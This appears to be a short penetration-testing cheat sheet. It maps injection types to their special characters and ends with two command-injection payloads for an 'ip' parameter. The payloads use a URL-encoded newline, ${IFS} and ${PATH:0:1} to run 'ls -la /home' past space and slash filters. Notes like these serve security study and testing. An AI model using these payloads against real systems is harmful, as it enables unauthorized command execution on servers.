Injection Type	Operators
SQL Injection	' , ; -- /* */
Command Injection	; &&
LDAP Injection	* ( ) & |
XPath Injection	' or and not substring concat count
OS Command Injection	; & |
Code Injection	' ; -- /* */ $() ${} #{} %{} ^
Directory Traversal/File Path Traversal	../ ..\\ %00
Object Injection	; & |
XQuery Injection	' ; -- /* */
Shellcode Injection	\x \u %u %n
Header Injection	\n \r\n \t %0d %0a %09



ip=127.0.0.1%0als${IFS}-la${PATH:0:1}home
ip=127.0.0.1%0als${IFS}-la${IFS}${PATH:0:1}home
